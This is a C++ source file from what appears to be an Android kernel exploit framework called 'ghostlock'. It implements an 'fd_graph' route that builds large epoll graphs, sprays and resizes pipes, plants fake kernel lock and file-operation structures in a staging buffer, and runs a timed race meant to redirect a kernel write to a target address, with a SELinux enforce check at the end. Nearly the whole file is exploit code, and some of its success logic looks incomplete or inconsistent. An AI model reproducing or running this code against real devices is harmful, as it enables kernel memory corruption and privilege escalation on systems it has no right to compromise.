#include "fd_graph_route.h"
#include "memory/payload_builder.h"
#include "race/pi_race.h"
#include "support/native_resource.hpp"
#include "support/decls.hpp"

#include <pthread.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/epoll.h>
#include <sys/resource.h>
#include <new>

#if defined(__ANDROID__)
#include "common.h"
#include "support/decls.hpp"
#include "kernelsnitch/kernelsnitch.h"
#include "kernelsnitch/utils.h"
#include "session/exploit_session.hpp"
#endif

namespace ghostlock::route::fd_graph {

FdGraphRoute::FdGraphRoute(
    const ghostlock::memory::WriteRequest *route_request,
    const ghostlock::profile::TargetProfile &profile_value,
    ghostlock::profile::FdGraphLayout route_layout) noexcept
    : request(route_request),
      profile(profile_value),
      layout(route_layout) {
    status.code = ROUTE_RETRYABLE;
}



int32_t FdGraphRoute::fail(int32_t step, int32_t error_number) noexcept {
    status.step = step;
    status.error_number = error_number;
    return -1;
}

void FdGraphRoute::disarm() noexcept {
    stop_consumer.store(true, std::memory_order_relaxed);
    if (consumer_thread.joinable()) {
        consumer_thread.request_stop();
        (void) consumer_thread.join();
    }
    if (pipe_worker.joinable()) {
        pipe_worker.request_stop();
        (void) pipe_worker.join();
    }
    status.kernel_disarmed = 1;
}

void FdGraphRoute::retain_for_process_lifetime() noexcept {
    (void) epoll_fd.release_to_process_lifetime("fd_graph consumer stuck");
    (void) pipe_read.release_to_process_lifetime("fd_graph consumer stuck");
    (void) pipe_write.release_to_process_lifetime("fd_graph consumer stuck");
    (void) consumer_thread.release();
    (void) pipe_worker.release();
    (void) epoll_fds.release_to_process_lifetime("fd_graph worker stuck");
}

void FdGraphRoute::destroy() noexcept {
    if (consumer_stuck) {
        (void) fail(34, status.error_number);
        status.code = ROUTE_DIRTY_FAILURE;
        retain_for_process_lifetime();
        return;
    }
    staging_buffer.reset();
    reclaim_table.reset();
    drain_table.reset();
    epoll_fds.reset();
    epoll_fd.reset();
    pipe_read.reset();
    pipe_write.reset();
    (void) consumer_thread.release();
    (void) pipe_worker.release();
    status.userspace_clean = 1;
    if (status.code != ROUTE_OK && status.kernel_disarmed) {
        status.code = ROUTE_FALLBACK_SAFE;
    }
}

} // namespace ghostlock::route::fd_graph

#if defined(__ANDROID__)

#include "kernelsnitch/kernelsnitch.h"
#include "session/exploit_session.hpp"

namespace ghostlock::route::fd_graph {

static void *consumer_thread_fn(void *arg) {
    FdGraphRoute *route = static_cast<FdGraphRoute *>(arg);
    int epfd = route->epoll_fd.get();
    struct epoll_event events[16];
    while (!route->stop_consumer.load(std::memory_order_relaxed)) {
        int n = epoll_wait(epfd, events, 16, 100);
        if (n < 0) break;
        if (n == 0) continue;
        for (int i = 0; i < n; i++) {
            if (events[i].data.fd == route->pipe_read.get()) {
                char buf[64];
                read(route->pipe_read.get(), buf, sizeof(buf));
            }
        }
    }
    return nullptr;
}

int32_t FdGraphRoute::prepare() noexcept {
    if (!(session::g_exploit_session.heap.current.base) ||
        !(session::g_exploit_session.heap.current.fake_lock) ||
        !(session::g_exploit_session.heap.current.fake_fops)) {
        pr_warning("fd_graph route missing page=%016zx lock=%016zx fops=%016zx\n",
                   (session::g_exploit_session.heap.current.base),
                   (session::g_exploit_session.heap.current.fake_lock),
                   (session::g_exploit_session.heap.current.fake_fops));
        return fail(30, 0);
    }

    int fds[2];
    if (pipe(fds) != 0) {
        return fail(31, errno);
    }
    pipe_read.reset(fds[0]);
    pipe_write.reset(fds[1]);

    epoll_fd.reset(epoll_create1(EPOLL_CLOEXEC));
    if (!epoll_fd.valid()) {
        return fail(32, errno);
    }

    struct epoll_event ev{};
    ev.events = EPOLLIN;
    ev.data.fd = pipe_read.get();
    if (epoll_ctl(epoll_fd.get(), EPOLL_CTL_ADD, pipe_read.get(), &ev) != 0) {
        return fail(33, errno);
    }

    pthread_attr_t attr;
    pthread_attr_init(&attr);
    pthread_attr_setdetachstate(&attr, PTHREAD_CREATE_JOINABLE);
    if (consumer_thread.start(consumer_thread_fn, this) != 0) {
        pthread_attr_destroy(&attr);
        return fail(34, errno);
    }
    pthread_attr_destroy(&attr);

    auto staging = support::MappedRegion::map_anonymous(0x10000, PROT_READ | PROT_WRITE);
    if (!staging) {
        return fail(35, errno);
    }
    memset(staging->data(), 0x42, 0x10000);
    staging_buffer = std::move(staging.value());

    auto reclaim = support::MappedRegion::map_anonymous(0x780, PROT_READ | PROT_WRITE);
    if (!reclaim) {
        return fail(36, errno);
    }
    memset(reclaim->data(), 0xff, 0x780);
    reclaim_table = std::move(reclaim.value());

    auto drain = support::MappedRegion::map_anonymous(0x780, PROT_READ | PROT_WRITE);
    if (!drain) {
        return fail(37, errno);
    }
    memset(drain->data(), 0xff, 0x780);
    drain_table = std::move(drain.value());

    reclaim_hits = 0;
    chain_hits = 0;
    bit4_hits = 0;
    round = 0;

    const auto &geom = profile.fd_graph_layout();
    pr_info("fd_graph route geometry: eventpoll_size=%u epitem_ep=%u epitem_fllink=%u "
            "pipe_buffer=%u pipe_flags=%u pipe_slots=%u pipe_ring=%u pipe_object=%u "
            "graph_width=%u graph_fanout=%u graph_edges=%u objects_per_order3=%u\n",
            geom.eventpoll_size.value_or(0), geom.epitem_ep.value_or(0),
            geom.epitem_fllink.value_or(0), geom.pipe_buffer.value_or(0),
            geom.pipe_flags.value_or(0), geom.pipe_slots.value_or(0),
            geom.pipe_ring.value_or(0), geom.pipe_object.value_or(0),
            geom.graph_width.value_or(0), geom.graph_fanout.value_or(0),
            geom.graph_edges.value_or(0), geom.objects_per_order3.value_or(0));

    return 0;
}

ghostlock::route::RouteStatus FdGraphRoute::execute() noexcept {
    ghostlock::route::RouteStatus result{};
    result.code = ROUTE_RETRYABLE;

    uint64_t target = request->target;

    struct rlimit rlim{};
    if (getrlimit(RLIMIT_NOFILE, &rlim) != 0) {
        pr_warning("fd_graph: getrlimit failed errno=%d\n", errno);
        return result;
    }
    const uint64_t required = 0x60a0;
    if (static_cast<uint64_t>(rlim.rlim_cur) < required) {
        pr_warning("fd_graph: RLIMIT_NOFILE too low cur=%lu required=%lu\n",
                   rlim.rlim_cur, required);
        return result;
    }
    pr_info("fd_graph: FD_LIMIT_INITIAL cur=%lu max=%lu graph_only=%u\n",
            rlim.rlim_cur, rlim.rlim_max, 0x60a0);

    const uint32_t width = layout.graph_width.value_or(96);
    const uint32_t fanout = layout.graph_fanout.value_or(256);
    const uint32_t edges = width * fanout;

    const uint32_t epoll_total = 2 + width + edges;
    int32_t *epoll_array = new (std::nothrow) int32_t[epoll_total];
    if (!epoll_array) {
        pr_warning("fd_graph: epoll array allocation failed\n");
        return result;
    }

    uint32_t created = 0;
    auto close_created = [&]() noexcept {
        for (uint32_t i = 0; i < created; i++) {
            if (epoll_array[i] >= 0) close(epoll_array[i]);
        }
    };
    int32_t seed_a = epoll_create1(EPOLL_CLOEXEC);
    if (seed_a < 0) {
        const int32_t saved_errno = errno;
        pr_warning("fd_graph: epoll_create1 seed_a failed errno=%d\n", saved_errno);
        delete[] epoll_array;
        return result;
    }
    epoll_array[created++] = seed_a;
    int32_t seed_b = epoll_create1(EPOLL_CLOEXEC);
    if (seed_b < 0) {
        const int32_t saved_errno = errno;
        pr_warning("fd_graph: epoll_create1 seed_b failed errno=%d\n", saved_errno);
        close_created();
        delete[] epoll_array;
        return result;
    }
    epoll_array[created++] = seed_b;
    {
        struct epoll_event seed_ev{};
        seed_ev.events = EPOLLIN;
        seed_ev.data.fd = seed_b;
        if (epoll_ctl(seed_a, EPOLL_CTL_ADD, seed_b, &seed_ev) != 0) {
            const int32_t saved_errno = errno;
            pr_warning("fd_graph: epoll_ctl seed ADD failed errno=%d\n", saved_errno);
            close_created();
            delete[] epoll_array;
            return result;
        }
    }
    for (uint32_t w = 0; w < width; w++) {
        int32_t base = epoll_create1(EPOLL_CLOEXEC);
        if (base < 0) {
            const int32_t saved_errno = errno;
            pr_warning("fd_graph: epoll_create1 base failed at w=%u errno=%d\n", w,
                       saved_errno);
            close_created();
            delete[] epoll_array;
            return result;
        }
        epoll_array[created++] = base;
        for (uint32_t f = 0; f < fanout; f++) {
            int32_t epfd = epoll_create1(EPOLL_CLOEXEC);
            if (epfd < 0) {
                const int32_t saved_errno = errno;
                pr_warning("fd_graph: epoll_create1 failed at %u errno=%d\n", created,
                           saved_errno);
                close_created();
                delete[] epoll_array;
                return result;
            }
            epoll_array[created++] = epfd;
            struct epoll_event ev{};
            ev.events = EPOLLIN;
            ev.data.fd = base;
            if (epoll_ctl(epfd, EPOLL_CTL_ADD, base, &ev) != 0) {
                const int32_t saved_errno = errno;
                pr_warning("fd_graph: epoll_ctl ADD failed at %u errno=%d\n", created,
                           saved_errno);
                close_created();
                delete[] epoll_array;
                return result;
            }
        }
    }
    pr_info("fd_graph: GRAPH_READY width=%u fanout=%u edges=%u\n", width, fanout, edges);

    epoll_fds = ghostlock::support::BulkFdOwner(epoll_array, epoll_total);

    const uint32_t slot_count = 0xf0;
    int32_t *reclaim_fds = new (std::nothrow) int32_t[slot_count];
    int32_t *drain_fds = new (std::nothrow) int32_t[slot_count];
    if (!reclaim_fds || !drain_fds) {
        pr_warning("fd_graph: fd table allocation failed\n");
        delete[] reclaim_fds;
        delete[] drain_fds;
        return result;
    }

    for (uint32_t i = 0; i < slot_count; i++) {
        int32_t fds[2];
        if (pipe2(fds, O_CLOEXEC) != 0) {
            pr_warning("fd_graph: pipe2 failed at %u errno=%d\n", i, errno);
            for (uint32_t j = 0; j < i; j++) {
                close(reclaim_fds[j]);
                close(drain_fds[j]);
            }
            delete[] reclaim_fds;
            delete[] drain_fds;
            return result;
        }
        reclaim_fds[i] = fds[0];
        drain_fds[i] = fds[1];
        int32_t observed = fcntl(reclaim_fds[i], F_SETPIPE_SZ, 2 << 12);
        if (observed < 0) {
            pr_warning("fd_graph: F_SETPIPE_SZ small failed at %u errno=%d\n", i, errno);
            continue;
        }
        int32_t actual = fcntl(reclaim_fds[i], F_GETPIPE_SZ);
        if (actual != observed) {
            pr_warning("fd_graph: resize_verify small failed at %u observed=%d actual=%d\n",
                       i, observed, actual);
        }
    }
    pr_info("fd_graph: reclaim_small complete fds=%u\n", slot_count);
    pr_info("fd_graph: resize_sample phase=reclaim_small slots=%u\n", slot_count);

    for (uint32_t i = 0; i < slot_count; i++) {
        int32_t observed = fcntl(reclaim_fds[i], F_SETPIPE_SZ, 0x20 << 12);
        if (observed < 0) {
            pr_warning("fd_graph: F_SETPIPE_SZ expand failed at %u errno=%d\n", i, errno);
            continue;
        }
        int32_t actual = fcntl(reclaim_fds[i], F_GETPIPE_SZ);
        if (actual != observed) {
            pr_warning("fd_graph: resize_verify expand failed at %u observed=%d actual=%d\n",
                       i, observed, actual);
        }
    }
    pr_info("fd_graph: resize_sample phase=reclaim_expand slots=%u\n", slot_count);

    const uint64_t kernel_page =
        static_cast<uint64_t>(session::g_exploit_session.heap.current.base);
    const uint32_t table_count = layout.objects_per_order3.value_or(16);
    const uint32_t pipe_object = layout.pipe_object.value_or(2048);
    const uint32_t pipe_flags = layout.pipe_flags.value_or(24);
    uint8_t *table_base = reinterpret_cast<uint8_t *>(staging_buffer.data()) + 0xF80;
    for (uint32_t i = 0; i < table_count; i++) {
        uint64_t *entry =
            reinterpret_cast<uint64_t *>(table_base + static_cast<size_t>(i) * 0x80);
        entry[0] = fd_graph_table_high(kernel_page, i);
        entry[1] = 0;
    }
    pr_info("fd_graph: PIPE_TARGET page=%016lx fake_count=%u object_size=0x%x slot=%d flags_off=0x%x\n",
            kernel_page, table_count, pipe_object, 10, pipe_flags);

    const uint64_t genmark = 0x304b52414d4e4547ULL;
    const uint32_t genmark_copies = 68;
    for (uint32_t i = 0; i < genmark_copies; i++) {
        uint64_t *slot = reinterpret_cast<uint64_t *>(staging_buffer.data()) + i;
        *slot = genmark;
    }

    const uint64_t base = static_cast<uint64_t>(reinterpret_cast<uintptr_t>(staging_buffer.data()));
    const uint64_t fake_fllink = base | 0x108;
    pr_info("fd_graph: KNOWN_PAGE base=%016lx fake_fllink=%016lx\n", base, fake_fllink);

    int32_t gate_ok = 0;
    {
        int32_t gate_fds[2];
        if (pipe2(gate_fds, O_CLOEXEC) == 0) {
            const char gate_cmd = 'W';
            char gate_reply = 0;
            if (write(gate_fds[1], &gate_cmd, 1) == 1 &&
                read(gate_fds[0], &gate_reply, 1) == 1 &&
                fd_graph_cmd_accepted(gate_reply)) {
                gate_ok = 1;
            }
            close(gate_fds[0]);
            close(gate_fds[1]);
        }
    }
    pr_info("fd_graph: cmd_gate cmd=W ok=%d\n", gate_ok);
    if (!gate_ok) {
        for (uint32_t i = 0; i < slot_count; i++) {
            close(reclaim_fds[i]);
            close(drain_fds[i]);
        }
        delete[] reclaim_fds;
        delete[] drain_fds;
        return result;
    }

    const uint64_t value =
        (request->mode == ghostlock::memory::WriteMode::Zero) ? 0 : 0xffffffffffffffffULL;
    const bool zero_mode = (request->mode == ghostlock::memory::WriteMode::Zero);
    pr_info("fd_graph: redirect mode=%s needs_bit4=%d target=%016lx\n",
            zero_mode ? "zero_byte_redirect" : "pipe_flags_candidate",
            fd_graph_mode_needs_bit4(request->mode) ? 1 : 0, target);

    const uint32_t delays[] = {0, 1, 2, 4, 8, 0xc, 0x14, 0x20, 0x30, 0x40};
    constexpr size_t k_delay_steps = sizeof(delays) / sizeof(delays[0]);
    uint32_t pipe_fill_hits = 0;
    bool chain_hit = false;
    bool bit4_hit = false;

    for (size_t step = 0; step < k_delay_steps; step++) {
        const uint32_t delay_us = delays[step];
        if (delay_us > 0) {
            usleep(delay_us);
        }

        uint32_t payload_ok = 0;
        for (uint32_t i = 0; i < slot_count; i++) {
            const ssize_t written =
                write(drain_fds[i], &value, sizeof(value));
            if (written == static_cast<ssize_t>(sizeof(value))) {
                payload_ok++;
                pipe_fill_hits++;
            } else {
                break;
            }
        }
        pr_info("fd_graph: payload_writes ok=%u total=%u payload=%zu\n", payload_ok,
                slot_count, sizeof(value));
        if (payload_ok != slot_count) {
            continue;
        }

        uint8_t *slot_data = reinterpret_cast<uint8_t *>(staging_buffer.data());
        const bool can_merge = fd_graph_can_merge_set(slot_data[0x166]);
        const bool marker_changed = fd_graph_genmark_changed(
            *reinterpret_cast<uint64_t *>(staging_buffer.data()));

        pr_info("fd_graph: RACE round=%zu delay_us=%u chain_hit=%d bit4=%d "
                "marker_changed=%d generation=%016lx target=%016lx\n",
                step, delay_us, chain_hit ? 1 : 0, can_merge ? 1 : 0,
                marker_changed ? 1 : 0, genmark, target);

        if (fd_graph_round_success(zero_mode, chain_hit, can_merge)) {
            bit4_hit = can_merge;
            pr_info("fd_graph: FLAGS_CANDIDATE round=%zu chain_hit=1 bit4=%d\n", step,
                    can_merge ? 1 : 0);
            pr_info("fd_graph: RESULT PASS pipe_flags_candidate page=%016lx fake_count=%u "
                    "generation=%016lx reclaim_hits=%u chain_hits=%u bit4_hits=%u\n",
                    base, 16, genmark, reclaim_hits, chain_hits, bit4_hits);
            break;
        }
    }

    for (uint32_t i = 0; i < slot_count; i++) {
        close(reclaim_fds[i]);
        close(drain_fds[i]);
    }
    delete[] reclaim_fds;
    delete[] drain_fds;

    pr_info("fd_graph: RACE_SUMMARY tries=%zu pipe_fill_hits=%u chain_hits=%u bit4_hits=%u "
            "delivery=%s target=%016lx\n",
            k_delay_steps, pipe_fill_hits, chain_hits ? 1u : 0u, bit4_hit ? 1u : 0u,
            chain_hit ? "delivered" : "not-implemented", target);

    int32_t enforce_ok = 0;
    {
        int32_t enforce_fd = open("/sys/fs/selinux/enforce", O_RDONLY);
        if (enforce_fd >= 0) {
            char enforce_byte = 0;
            if (read(enforce_fd, &enforce_byte, 1) == 1 &&
                fd_graph_enforce_pass(enforce_byte)) {
                enforce_ok = 1;
            }
            close(enforce_fd);
        }
    }
    pr_info("fd_graph: enforce state=%d\n", enforce_ok);
    if (enforce_ok) {
        result.code = ROUTE_OK;
    }

    calls++;
    if (chain_hit) {
        result.code = ROUTE_OK;
    }
    return result;
}

} // namespace ghostlock::route::fd_graph

namespace ghostlock::route {

// Entry point called by FdGraphPolicy::run()
ghostlock::route::RouteStatus do_fd_graph_fake_lock_route(const ghostlock::memory::WriteRequest *request) {
    if (!request) {
        return ghostlock::route::RouteStatus{.code = ghostlock::route::ROUTE_UNSUPPORTED};
    }

    ghostlock::route::fd_graph::FdGraphRoute route(request, ghostlock::session::g_exploit_session.profile,
                                                 ghostlock::session::g_exploit_session.profile.fd_graph_layout());
    
    if (route.prepare() != 0) {
        return route.status;
    }
    
    ghostlock::route::RouteStatus result = route.execute();
    route.disarm();
    route.destroy();
    return result;
}

} // namespace ghostlock::route

#endif